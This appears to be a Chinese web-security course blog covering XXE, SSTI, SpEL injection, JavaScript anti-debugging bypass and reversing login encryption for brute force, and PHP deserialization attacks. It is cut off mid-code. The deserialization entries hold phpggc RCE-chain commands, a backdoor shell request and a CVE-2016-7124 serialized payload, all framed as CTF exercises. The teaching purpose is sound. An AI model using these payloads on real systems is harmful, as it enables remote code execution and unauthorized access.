XML外部实体注入，当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用这一可引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务等攻击。<br>-XMLReader<br>-SAXReader<br>-SAXBuilder<br>-Unmarshaller<br>-DocumentBuilder  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 审计的函数</span><br><span class="line"> * 1. XMLReader</span><br><span class="line"> * 2. SAXReader</span><br><span class="line"> * 3. DocumentBuilder</span><br><span class="line"> * 4. XMLStreamReader</span><br><span class="line"> * 5. SAXBuilder</span><br><span class="line"> * 6. SAXParser</span><br><span class="line"> * 7. SAXSource</span><br><span class="line"> * 8. TransformerFactory</span><br><span class="line"> * 9. SAXTransformerFactory</span><br><span class="line"> * 10. SchemaFactory</span><br><span class="line"> * 11. Unmarshaller</span><br><span class="line"> * 12. XPathExpression</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h2 id="Java安全-SSTI模版-Thymeleaf-URL"><a href="#Java安全-SSTI模版-Thymeleaf-URL" class="headerlink" title="Java安全-SSTI模版-Thymeleaf&amp;URL"></a>Java安全-SSTI模版-Thymeleaf&amp;URL</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSTI(Server Side Template Injection) 服务器模板注入, 服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容。  </p><ul><li>1、URL作视图    </li><li>2、Velocity  </li><li>3、Thymeleaf  </li><li>其他语言参考：<br><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></li></ul><h2 id="Java安全-SPEL表达式-SpringBoot框架"><a href="#Java安全-SPEL表达式-SpringBoot框架" class="headerlink" title="Java安全-SPEL表达式-SpringBoot框架"></a>Java安全-SPEL表达式-SpringBoot框架</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpEL（Spring Expression Language）表达式注入, 是一种功能强大的表达式语言、用于在运行时查询和操作对象图，由于未对参数做过滤可造成任意命令执行。   </p><ul><li>1、Spring表达式  </li><li>2、Spring反射绕过<br>参考：<a href="https://www.jianshu.com/p/e3c77c053359">https://www.jianshu.com/p/e3c77c053359</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>65WEB攻防-JS应用3</title>
      <link href="/2023/12/02/65WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A83/"/>
      <url>/2023/12/02/65WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A83/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>71、JavaScript安全-泄漏配置信息</li><li>72、JavaScript安全-获取接口测试</li><li>73、JavaScript安全-代码逻辑分析</li><li>74、JavaScript安全-框架漏洞检测</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中…. </p><p> <img src="/2023/12/02/65WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A83/JS%E5%BA%94%E7%94%A81.png"><br> <img src="/2023/12/02/65WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A83/JS%E5%BA%94%E7%94%A82.png"></p><h2 id="JS安全"><a href="#JS安全" class="headerlink" title="JS安全"></a>JS安全</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JS开发应用和PHP，JAVA等区别在于即没源代码，也可通过浏览器查看源代码。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试，一般会在JS中寻找更多URL地址，（加密算法，APIkey配置，验证逻辑，框架漏洞等）进行后期安全测试。  </p><ul><li><p>1、会增加攻击面（URL、接口，分析调试代码逻辑）  </p></li><li><p>2、敏感信息（用户密码、ak&#x2F;sk、token&#x2F;session）  </p></li><li><p>3、潜在危险函数（eval、dangerallySetInnerHTML）  </p></li><li><p>4、开发框架类(寻找历史漏洞Vue、NodeJS、Angular等)  </p></li><li><p>打包器Webpack：PackerFuzzer<br>AK&#x2F;SK云安全利用：工具箱CF（云安全后续会讲更多）<br>浏览器插件：Pentestkit FindSomething Wappalyzer（前期的JS收集项目）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64WEB攻防-JS应用2</title>
      <link href="/2023/12/01/64WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A82/"/>
      <url>/2023/12/01/64WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A82/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>69、JavaScript-反调试&amp;方法&amp;绕过</li><li>70、JavaScript-代码混淆&amp;识别&amp;还原</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中…. </p><p> <img src="/2023/12/01/64WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A82/JS%E5%8A%A0%E5%AF%86.png"><br> <img src="/2023/12/01/64WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A82/%E5%8F%8D%E8%B0%83%E8%AF%95.png"></p><h2 id="JS逆向-反调试-检测-绕过"><a href="#JS逆向-反调试-检测-绕过" class="headerlink" title="JS逆向-反调试-检测&amp;绕过"></a>JS逆向-反调试-检测&amp;绕过</h2><p>程序加入反调试：  </p><ul><li>1、反调试：<br>实现防止他人调试、动态分析自己的代码  </li><li>2、检测调试方法：(见图)<br>-键盘监听（F12）<br>-检测浏览器的高度插值<br>-检测开发者人员工具变量是否为true<br>-利用console.log调用次数<br>-利用代码运行的时间差<br>–利用toString<br>-检测非浏览器  </li><li>3、常见绕过方法：<br>-禁用断点法<br>-条件断点法<br>-此处暂停法<br>-置空函数法<br>-本地覆盖法</li></ul><h2 id="JS逆向-混淆加密-识别-还原"><a href="#JS逆向-混淆加密-识别-还原" class="headerlink" title="JS逆向-混淆加密-识别&amp;还原"></a>JS逆向-混淆加密-识别&amp;还原</h2><ul><li>代码混淆加密：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上述几种方法，已经达到了反调试的效果，但如果他人查看代码，也可能被找出检测功能并删去。为了防止反调试功能被剔除，我们可以对JS代码进行混淆加密。  </li><li>开源代码混淆解密<br>JJEncode AAEncode JSFuck<br><a href="https://www.sojson.com/">https://www.sojson.com/</a>  </li><li>商业代码混淆解密<br><a href="https://www.jsjiami.com/">https://www.jsjiami.com/</a><br><a href="https://jsdec.js.org/">https://jsdec.js.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>63WEB攻防-JS应用1</title>
      <link href="/2023/12/01/63WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A81/"/>
      <url>/2023/12/01/63WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A81/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>66、JavaScript-作用域&amp;调用堆栈</li><li>67、JavaScript-断点调试&amp;全局搜索</li><li>68、JavaScript-Burp算法模块使用</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中…. </p><p> <img src="/2023/12/01/63WEB%E6%94%BB%E9%98%B2-JS%E5%BA%94%E7%94%A81/JS%E5%8A%A0%E5%AF%86.png"></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li><p>1、作用域：（本地&amp;全局）<br>简单来说就是运行后相关的数据值  </p></li><li><p>2、调用堆栈：（由下到上）<br>简单来说就是代码的执行逻辑顺序  </p></li><li><p>3、常见分析调试：<br>-代码全局搜索<br>-文件流程断点<br>-代码标签断点<br>-XHR提交断点  </p></li><li><p>4、为什么要学这个？<br>-针对JS开发应用<br>-密码登录枚举爆破<br>-参数提交漏洞检测<br>-泄漏URL有更多测试</p></li></ul><h2 id="JS逆向-流程-全局搜索-登录算法"><a href="#JS逆向-流程-全局搜索-登录算法" class="headerlink" title="JS逆向-流程&amp;全局搜索-登录算法"></a>JS逆向-流程&amp;全局搜索-登录算法</h2><p>流程断点：审查元素抓网络请求包发起程序<br>全局搜索：通过抓包参数名进行代码全局搜索  </p><h2 id="JS逆向-标签-XHR断点-登录算法"><a href="#JS逆向-标签-XHR断点-登录算法" class="headerlink" title="JS逆向-标签&amp;XHR断点-登录算法"></a>JS逆向-标签&amp;XHR断点-登录算法</h2><p>标签断点：审查元素对应标签按钮加入断点<br>XHR断点：审查元素源代码加入XHR断点配置  </p><h2 id="JS逆向-结合BurpSuite-插件引用"><a href="#JS逆向-结合BurpSuite-插件引用" class="headerlink" title="JS逆向-结合BurpSuite-插件引用"></a>JS逆向-结合BurpSuite-插件引用</h2><ul><li><p>1、下载phantomjs并设置环境变量<br><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a>  </p></li><li><p>2、BurpSuite加载jsEncrypter插件<br><a href="https://github.com/c0ny1/jsEncrypter/releases">https://github.com/c0ny1/jsEncrypter/releases</a>  </p></li><li><p>3、对逆向的加密算法提取JS文件及代码  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JSEncrypt.js</span><br><span class="line"></span><br><span class="line">var r = new JSEncrypt, </span><br><span class="line">o = &quot;xxxxxxxxx&quot;;</span><br><span class="line">    r.setPublicKey(o);</span><br><span class="line">    var s = r.encrypt(password)</span><br><span class="line">return s</span><br></pre></td></tr></table></figure></li><li><p>4、讲代码写入到模版中（引用JS和调用加密）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var wasSuccessful = phantom.injectJs(&#x27;JSEncrypt.js&#x27;);</span><br><span class="line"></span><br><span class="line">function encrypt(password)&#123;</span><br><span class="line">var r = new JSEncrypt, </span><br><span class="line">o = &quot;xxxxxxxxx&quot;;</span><br><span class="line">    r.setPublicKey(o);</span><br><span class="line">    var s = r.encrypt(password)</span><br><span class="line">return s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 处理函数</span><br><span class="line">function js_encrypt(payload)&#123;</span><br><span class="line">var newpayload;</span><br><span class="line">/**********在这里编写调用加密函数进行加密的代码************/</span><br><span class="line">var newpayload=encrypt(payload)</span><br><span class="line">/**********************************************************/</span><br><span class="line">return newpayload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>5、运行刚写入的模版文件后插件连接测试</p></li></ul><p><code>phantomjs xxxxx.js  </code></p><ul><li>6、正常设置发包后选择引用插件选项</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>62WEB攻防-PHP反序列化3</title>
      <link href="/2023/11/28/62WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/"/>
      <url>/2023/11/28/62WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>63、PHP-反序列化-开发框架类项目</li><li>64、PHP-反序列化-Payload生成项目</li><li>65、PHP-反序列化-Payload生成综合项目</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="反序列化链项目-PHPGGC-NotSoSecure"><a href="#反序列化链项目-PHPGGC-NotSoSecure" class="headerlink" title="反序列化链项目-PHPGGC&amp;NotSoSecure"></a>反序列化链项目-PHPGGC&amp;NotSoSecure</h2><h3 id="NotSoSecure"><a href="#NotSoSecure" class="headerlink" title="NotSoSecure"></a>NotSoSecure</h3><p><a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了利用反序列化漏洞，需要设置不同的工具，如 YSoSerial(Java)、YSoSerial.NET、PHPGGC 和它的先决条件。DeserializationHelper 是包含对 YSoSerial(Java)、YSoSerial.Net、PHPGGC 和其他工具的支持的Web界面。使用Web界面，您可以为各种框架生成反序列化payload.<br>Java – YSoSerial<br>NET – YSoSerial.NET<br>PHP – PHPGGC<br>Python - 原生  </p><h3 id="PHPGGC"><a href="#PHPGGC" class="headerlink" title="PHPGGC"></a>PHPGGC</h3><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHPGGC是一个包含unserialize()有效载荷的库以及一个从命令行或以编程方式生成它们的工具。当在您没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需执行查找小工具并将它们组合的繁琐步骤。 它可以看作是frohoff的ysoserial的等价物，但是对于PHP。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目前该工具支持的小工具链包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii和ZendFramework等。  </p><h2 id="反序列化框架利用-ThinkPHP-Yii-Laravel"><a href="#反序列化框架利用-ThinkPHP-Yii-Laravel" class="headerlink" title="反序列化框架利用-ThinkPHP&amp;Yii&amp;Laravel"></a>反序列化框架利用-ThinkPHP&amp;Yii&amp;Laravel</h2><p>[安洵杯 2019]iamthinking Thinkphp V6.0.X 反序列化<br><code>./phpggc ThinkPHP/RCE4 system &#39;cat /flag&#39; --url</code></p><p>CTFSHOW 反序列化 267 Yii2反序列化<br>弱口令登录&#x2F;源码提示泄漏  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：index.php?r=site%2Fabout&amp;view-source</span><br><span class="line">GET：/index.php?r=backdoor/shell&amp;code=</span><br><span class="line">./phpggc Yii2/RCE1 exec &#x27;cp /fla* tt.txt&#x27; --base64</span><br></pre></td></tr></table></figure><p>CTFSHOW 反序列化 271 Laravel反序列化<br><code>./phpggc Laravel/RCE2 system &quot;id&quot; --url</code></p><h2 id="Thinkphp-反序列化链分析"><a href="#Thinkphp-反序列化链分析" class="headerlink" title="Thinkphp 反序列化链分析"></a>Thinkphp 反序列化链分析</h2><p>Thinkphp-All-vuln-main  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>61WEB攻防-PHP反序列化2</title>
      <link href="/2023/11/28/61WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/"/>
      <url>/2023/11/28/61WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>60、PHP-反序列化-属性类型&amp;显示特征</li><li>61、PHP-反序列化-CVE绕过&amp;字符串逃逸</li><li>62、PHP-反序列化-原生类生成&amp;利用&amp;配合</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/11/28/61WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png"><br> <img src="/2023/11/28/61WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png"><br> <img src="/2023/11/28/61WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png"><br> <img src="/2023/11/28/61WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%964.png"></p><h2 id="PHP-属性类型-共有-私有-保护"><a href="#PHP-属性类型-共有-私有-保护" class="headerlink" title="PHP-属性类型-共有&amp;私有&amp;保护"></a>PHP-属性类型-共有&amp;私有&amp;保护</h2><h3 id="1、对象变量属性："><a href="#1、对象变量属性：" class="headerlink" title="1、对象变量属性："></a>1、对象变量属性：</h3><p>public(公共的):在本类内部、外部类、子类都可以访问<br>protect(受保护的):只有本类或子类或父类中可以访问<br>private(私人的):只有本类内部可以使用  </p><h3 id="2、序列化数据显示："><a href="#2、序列化数据显示：" class="headerlink" title="2、序列化数据显示："></a>2、序列化数据显示：</h3><p>public属性序列化的时候格式是正常成员名<br>private属性序列化的时候格式是%00类名%00成员名<br>protect属性序列化的时候格式是%00*%00成员名  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//public private protected说明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;xiaodi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="string">&quot;31&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP-绕过漏洞-CVE-字符串逃逸"><a href="#PHP-绕过漏洞-CVE-字符串逃逸" class="headerlink" title="PHP-绕过漏洞-CVE&amp;字符串逃逸"></a>PHP-绕过漏洞-CVE&amp;字符串逃逸</h2><h3 id="1、CVE-2016-7124（-wakeup绕过）"><a href="#1、CVE-2016-7124（-wakeup绕过）" class="headerlink" title="1、CVE-2016-7124（__wakeup绕过）"></a>1、CVE-2016-7124（__wakeup绕过）</h3><p>漏洞编号：CVE-2016-7124<br>影响版本：PHP 5&lt;5.6.25; PHP 7&lt;7.0.10<br>漏洞危害：如存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup执行  </p><p>Demo：见CVE.PHP与版本切换演示  </p><p>案例：<br>[极客大挑战 2019]PHP<br>1、下载源码分析，触发flag条件<br>2、分析会触发调用__wakeup 强制username值<br>3、利用语言漏洞绕过 CVE-2016-7124<br>4、构造payload后 修改满足漏洞条件触发  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload：</span><br><span class="line">select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure><h3 id="2、字符串逃逸-难理解"><a href="#2、字符串逃逸-难理解" class="headerlink" title="2、字符串逃逸(难理解)"></a>2、字符串逃逸(难理解)</h3><p>字符变多-str1.php str1-pop.php<br>字符变少-str2.php str2-pop.php<br>案例——CTFSHOW-Web262（逃逸解法）  </p><h2 id="PHP-原生类Tips-获取-利用-配合"><a href="#PHP-原生类Tips-获取-利用-配合" class="headerlink" title="PHP-原生类Tips-获取&amp;利用&amp;配合"></a>PHP-原生类Tips-获取&amp;利用&amp;配合</h2><p>参考案例：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a><br>-PHP有那些原生类-见脚本使用<br>-常见使用的原生类-见参考案例<br>-原生类该怎么使用-见官方说明  </p><h3 id="1、生成原生类"><a href="#1、生成原生类" class="headerlink" title="1、生成原生类"></a>1、生成原生类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="2、本地Demo-xss"><a href="#2、本地Demo-xss" class="headerlink" title="2、本地Demo-xss"></a>2、本地Demo-xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ 